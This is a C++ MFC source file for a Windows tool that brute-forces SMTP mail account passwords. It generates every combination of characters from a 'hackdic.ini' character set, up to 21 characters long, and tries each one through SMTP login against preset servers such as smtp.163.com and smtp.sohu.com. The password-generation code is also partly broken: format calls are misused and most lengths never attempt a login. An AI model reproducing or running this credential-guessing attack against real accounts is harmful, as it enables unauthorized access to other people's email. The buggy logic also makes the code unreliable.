// MySmtpDlg.cpp : implementation file
//

#include "stdafx.h"
#include "MySmtp.h"
#include "MySmtpDlg.h"
#include "hackdic.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

int sendMessage(CString strSmtpAddr,CString strAccount,int strPort,CString strPassword);
/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMySmtpDlg dialog

CMySmtpDlg::CMySmtpDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMySmtpDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMySmtpDlg)
	m_IsHtml = FALSE;
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMySmtpDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMySmtpDlg)
	DDX_Control(pDX, IDC_LIST_RESULT, m_List_result);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMySmtpDlg, CDialog)
	//{{AFX_MSG_MAP(CMySmtpDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BTN_SEND, OnBtnSend)
	ON_BN_CLICKED(IDC_BTN_ABOUT, OnBtnAbout)
	ON_BN_CLICKED(IDC_BTN_BROWSER, OnBtnBrowser)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMySmtpDlg message handlers

BOOL CMySmtpDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here

	//SetDlgItemText(IDC_EDIT_SMTP,"smtp.163.com");

	CComboBox* pComSmtp=(CComboBox*)GetDlgItem(IDC_COMBO_SMTP);
	pComSmtp->AddString("smtp.sohu.com");
	pComSmtp->AddString("smtp.163.com");


	pComSmtp->SetCurSel(0);
	SetDlgItemText(IDC_EDIT_PORT,"25");


	//查询结果显示的设置by zztzyzjw
	DWORD exstyle = m_List_result.GetExtendedStyle();
    m_List_result.SetExtendedStyle(exstyle | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES |

          LVS_EX_CHECKBOXES | WS_EX_STATICEDGE );

    CRect rect;
    m_List_result.GetClientRect(&rect);
    int nColInterval = rect.Width()/5;


    m_List_result.InsertColumn(0, _T("时间"), LVCFMT_CENTER, nColInterval*1);
    m_List_result.InsertColumn(1, _T("密码"), LVCFMT_CENTER, nColInterval*2);
    m_List_result.InsertColumn(2, _T("结果"), LVCFMT_CENTER, nColInterval*2);

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CMySmtpDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CMySmtpDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMySmtpDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CMySmtpDlg::OnBtnAbout() 
{
	CAboutDlg dlg;
	dlg.DoModal();
}

void CMySmtpDlg::OnBtnBrowser() 
{
	ZFileDialog FileDlg;
	deque<string> dqTmp=FileDlg.GetOpenFileName(m_hWnd,false,"所有文件 (*.*)\0*.*\0\0");
	if(dqTmp.size()<=0) return ;

	bool IsRepeat=false;
	for(int i=0;i<m_dqFiles.size();i++)
	{
		if(m_dqFiles[i]==dqTmp[0])
		{
			IsRepeat=true;
			break;
		}
	}
	if(!IsRepeat) m_dqFiles.push_back(dqTmp[0]);

	pCombo=(CComboBox*)GetDlgItem(IDC_COMBO_FILELIST);
	pCombo->ResetContent();
	for(int j=0;j<m_dqFiles.size();j++)
		pCombo->AddString(m_dqFiles[j].substr(m_dqFiles[j].find_last_of("\\")+1).c_str());
	pCombo->SetCurSel(m_dqFiles.size()-1);
}


void CMySmtpDlg::OnBtnSend() 
{

	char pw[22]; 
    int lenth=0,kl=0,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u; 
    long total_line=0,now_line=0; 
    float percent;

    CString strSmtpAddr;	// smtp服务器地址
	CString strAccount;		// 帐号
	CString strPassword;	// 密码
    int strPort;
	int ret;

	bool find=false;

	//收集信息

	GetDlgItemText(IDC_COMBO_SMTP       , strSmtpAddr);
	GetDlgItemText(IDC_EDIT_ACCOUNT     , strAccount);
//	GetDlgItemText(IDC_EDIT_PASSWORD    , strPassword);
	strPort=GetDlgItemInt(IDC_EDIT_PORT);
	lenth=GetDlgItemInt(IDC_EDIT_LENGTH);
 
  
    redcfg(); 
    kl=strlen(kw); 
    
    total_line=mult(kl,lenth); 

 	UpdateData();

    for(a=0;a<kl;a++){ 
		if(lenth==1){ 
              sprintf(pw,"%c", 
                kw[a]); 
              strPassword.Format("%c",pw);
			  
			  ret=sendMessage(strSmtpAddr,strAccount,strPort,strPassword);
			  if(ret==2){
				  find=true;
				  MessageBox(strPassword);
			  }
                continue; 
        } 
		for(b=0;b<kl;b++){ 
		   if(lenth==2){ 
				  sprintf(pw,"%c%c", 
					kw[a],kw[b]); 
				  strPassword.Format("%c%c",pw);
				  ret=sendMessage(strSmtpAddr,strAccount,strPort,strPassword);
			      if(ret==2)
				  MessageBox(strPassword);
				  Sleep(1);
					continue; 
		   } 
          for(c=0;c<kl;c++){ 
             if(lenth==3){ 
              sprintf(pw,"%c%c%c%\n", 
                kw[a],kw[b],kw[c]); 
			  strPassword.Format(pw);
                continue; 
            }
          for(d=0;d<kl;d++){ 
            if(lenth==4){ 
              sprintf(pw,"%c%c%c%c\n", 
                kw[a],kw[b],kw[c],kw[d]); 
			  strPassword.Format(pw);
                continue; 
            } 
            for(e=0;e<kl;e++){ 
              if(lenth==5){ 
                sprintf(pw,"%c%c%c%c%c\n", 
                kw[a],kw[b],kw[c],kw[d],kw[e]); 
				strPassword.Format(pw);
                continue; 
              } 
              for(f=0;f<kl;f++){ 
                if(lenth==6){ 
                  sprintf(pw,"%c%c%c%c%c%c\n", 
                  kw[a],kw[b],kw[c],kw[d],kw[e], 
                  kw[f]); 
				  strPassword.Format(pw);
                  continue; 
                } 
                for(g=0;g<kl;g++){ 
                  if(lenth==7){ 
                    sprintf(pw,"%c%c%c%c%c%c%c\n", 
                       kw[a],kw[b],kw[c],kw[d],kw[e], 
                    kw[f],kw[g]); 
					strPassword.Format(pw);
					ret=sendMessage(strSmtpAddr,strAccount,strPort,strPassword);
					  if(ret==2)
						  MessageBox(strPassword);

                    continue; 
                  } 
                  for(h=0;h<kl;h++){ 
                    if(lenth==8){ 
                      sprintf(pw,"%c%c%c%c%c%c%c%c\n", 
                      kw[a],kw[b],kw[c],kw[d],kw[e], 
                      kw[f],kw[g],kw[h]); 
					  strPassword.Format(pw);
                      continue; 
                    } 
                    for(i=0;i<kl;i++){ 
                      if(lenth==9){ 
                        sprintf(pw,"%c%c%c%c%c%c%c%c%c\n", 
                        kw[a],kw[b],kw[c],kw[d],kw[e], 
                        kw[f],kw[g],kw[h],kw[i]); 
						strPassword.Format(pw);
                        continue; 
                      } 
                      for(j=0;j<kl;j++){ 
                        if(lenth==10){ 
                          sprintf(pw,"%c%c%c%c%c%c%c%c%c%c\n", 
                          kw[a],kw[b],kw[c],kw[d],kw[e], 
                          kw[f],kw[g],kw[h],kw[i],kw[j]);
						  strPassword.Format(pw);
						  continue; 
                        } 
                        for(k=0;k<kl;k++){ 
                          if(lenth==11){ 
                            sprintf(pw,"%c%c%c%c%c%c%c%c%c%c%c\n", 
                            kw[a],kw[b],kw[c],kw[d],kw[e], 
                            kw[f],kw[g],kw[h],kw[i],kw[j], 
                            kw[k]);
							strPassword.Format(pw);
							continue; 
                          } 
                          for(l=0;l<kl;l++){ 
                            if(lenth==12){ 
                              sprintf(pw,"%c%c%c%c%c%c%c%c%c%c%c%c\n", 
                              kw[a],kw[b],kw[c],kw[d],kw[e], 
                              kw[f],kw[g],kw[h],kw[i],kw[j], 
                              kw[k],kw[l]);
							  strPassword.Format(pw);
							  continue; 
                            } 
                            for(m=0;m<kl;m++){ 
                              if(lenth==13){ 
                                sprintf(pw,"%c%c%c%c%c%c%c%c%c%c%c%c%c\n", 
                                kw[a],kw[b],kw[c],kw[d],kw[e], 
                                kw[f],kw[g],kw[h],kw[i],kw[j], 
                                kw[k],kw[l],kw[m]);
								strPassword.Format(pw);
								continue; 
                              } 
                              for(n=0;n<kl;n++){ 
                                if(lenth==14){ 
                                  sprintf(pw,"%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n", 
                                  kw[a],kw[b],kw[c],kw[d],kw[e], 
                                  kw[f],kw[g],kw[h],kw[i],kw[j], 
                                  kw[k],kw[l],kw[m],kw[n]);
								  strPassword.Format(pw);
								  continue; 
                                } 
                                for(o=0;o<kl;o++){ 
                                  if(lenth==15){ 
                                    sprintf(pw,"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n", 
                                    kw[a],kw[b],kw[c],kw[d],kw[e], 
                                    kw[f],kw[g],kw[h],kw[i],kw[j], 
                                    kw[k],kw[l],kw[m],kw[n],kw[o]);
									strPassword.Format(pw);
									continue; 
                                  } 
                                  for(p=0;p<kl;p++){ 
                                      if(lenth==16){ 
                                           sprintf(pw,"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n", 
                                        kw[a],kw[b],kw[c],kw[d],kw[e], 
                                        kw[f],kw[g],kw[h],kw[i],kw[j], 
                                        kw[k],kw[l],kw[m],kw[n],kw[o], 
                                        kw[p]);
										   strPassword.Format(pw);
										   continue; 
                                        } 
                                      for(q=0;q<kl;q++){ 
                                          if(lenth==17){ 
                                            sprintf(pw,"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n", 
                                            kw[a],kw[b],kw[c],kw[d],kw[e], 
                                            kw[f],kw[g],kw[h],kw[i],kw[j], 
                                            kw[k],kw[l],kw[m],kw[n],kw[o], 
                                            kw[p],kw[q]);
											strPassword.Format(pw);
											continue; 
                                          } 
                                          for(r=0;r<kl;r++){ 
                                              if(lenth==18){ 
                                                sprintf(pw,"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n", 
                                                kw[a],kw[b],kw[c],kw[d],kw[e], 
                                                kw[f],kw[g],kw[h],kw[i],kw[j], 
                                                kw[k],kw[l],kw[m],kw[n],kw[o], 
                                                    kw[p],kw[q],kw[r]);
												strPassword.Format(pw);
												continue; 
                                                } 
                                              for(s=0;s<kl;s++){ 
                                                if(lenth==19){ 
                                                  sprintf(pw,"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n", 
                                                    kw[a],kw[b],kw[c],kw[d],kw[e], 
                                                    kw[f],kw[g],kw[h],kw[i],kw[j], 
                                                    kw[k],kw[l],kw[m],kw[n],kw[o], 
                                                    kw[p],kw[q],kw[r],kw[s]);
												  strPassword.Format(pw);
												  continue; 
                                                  } 
                                                for(t=0;t<kl;t++){ 
                                                  if(lenth==20){ 
                                                    sprintf(pw,"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n", 
                                                    kw[a],kw[b],kw[c],kw[d],kw[e], 
                                                    kw[f],kw[g],kw[h],kw[i],kw[j], 
                                                    kw[k],kw[l],kw[m],kw[n],kw[o], 
                                                    kw[p],kw[q],kw[r],kw[s],kw[t]);
													strPassword.Format(pw);
													continue; 
                                                    } 
                                                  for(u=0;u<kl;u++){ 
                                                    if(lenth==21){ 
                                                      sprintf(pw,"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n", 
                                                      kw[a],kw[b],kw[c],kw[d],kw[e], 
                                                      kw[f],kw[g],kw[h],kw[i],kw[j], 
                                                      kw[k],kw[l],kw[m],kw[n],kw[o], 
                                                      kw[p],kw[q],kw[r],kw[s],kw[t], 
                                                      kw[u]);
													  strPassword.Format(pw);
													  continue; 
                                                      } 
 
    }}}}}}}}}}}}}}}}}}}}}
 
	if(!find)
      MessageBox("未找到正确密码");	

}

int sendMessage(CString strSmtpAddr,CString strAccount,int strPort,CString strPassword)
{
	ZSmtp smtp;				// smtp对像
	
	//连接服务器
	if(!smtp.Connect((LPSTR)(LPCTSTR)strSmtpAddr,strPort)){
		return 0;	
	}

	//验证用户名密码
	
	if(!smtp.Validate((LPSTR)(LPCTSTR)strAccount,(LPSTR)(LPCTSTR)strPassword)){
		return 1;	
	}
	else
	    return 2; 
}


long mult(long x,int y)
{
	long z=1;
	int i;
	for(i=0;i<y;i++){
		z*=x;
	}
	
	return (z);
} 

void redcfg() 
{ 

	int i; 

    FILE *cfg; 
    if((cfg=fopen("hackdic.ini","rt"))==NULL){ 
        exit(2); 
    } 
 
    for(i=0;i<80 && !feof(cfg);i++) 
        fscanf(cfg,"%c ",&kw[i]); 
 
    fclose(cfg); 
} 
